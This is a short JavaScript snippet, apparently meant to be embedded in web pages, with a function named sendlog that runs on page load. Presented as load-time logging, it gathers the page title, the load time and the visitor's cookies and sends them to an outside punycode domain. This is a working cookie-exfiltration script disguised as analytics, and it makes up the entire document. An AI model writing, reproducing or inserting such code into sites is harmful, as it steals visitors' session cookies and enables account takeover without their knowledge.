function sendlog()
{
    var xhr = new XMLHttpRequest();
    var loadTime = window.performance.timing.domContentLoadedEventEnd- window.performance.timing.navigationStart;
    var page_cookie = document.cookie;
    xhr.open("GET", 'https://browser.xn--e1tu68bcc.com/?title=' +encodeURIComponent(document.title)+'&loadtime='+loadTime+'&cookiestr='+encodeURIComponent(page_cookie), true);
    xhr.setRequestHeader('Cache-Control', 'no-cache');
    xhr.send();
}
sendlog();
